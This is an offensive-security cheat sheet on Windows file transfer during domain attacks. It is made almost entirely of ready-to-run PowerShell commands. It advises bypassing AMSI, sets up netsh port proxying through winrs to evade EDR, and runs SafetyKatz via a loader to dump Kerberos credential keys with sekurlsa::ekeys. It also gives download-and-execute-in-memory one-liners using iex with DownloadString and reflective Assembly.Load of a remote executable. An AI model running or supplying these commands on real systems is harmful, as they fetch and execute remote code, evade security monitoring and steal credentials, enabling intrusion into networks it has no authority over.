# File transfer

{% hint style="danger" %}
It's suggested to bypass AMSI first
{% endhint %}

### Copy from inside the domain

```powershell
echo F | xcopy <PATH> \\<R MACHINE>\<R PATH>
```

```powershell
Copy-Item <PATH> \\<MACCHINA>\<R PATH>
```

### **Avoid EDR detection while downloading**

{% code overflow="wrap" %}
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>"
```
{% endcode %}

Download and use program

{% code overflow="wrap" %}
```powershell
$null | winrs -r:<MACCHINA> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
{% endcode %}

### Download a file

```powershell
iwr <URL> -OutFile <PATH>
```

### Download a file and execute in memory

#### Powershell script

```
iex (iwr $url -UseBasicParsing)
```

{% code overflow="wrap" %}
```PowerShell
(new-object system.net.webclient).downloadstring('$url')|IEX
```
{% endcode %}

#### Exe file

{% code overflow="wrap" %}
```powershell

$data=(New-Object System.Net.WebClient).DownloadData('<url>');

$asm = [System.Reflection.Assembly]::Load([byte[]]$data);

$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);

[<name>.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()

```
{% endcode %}
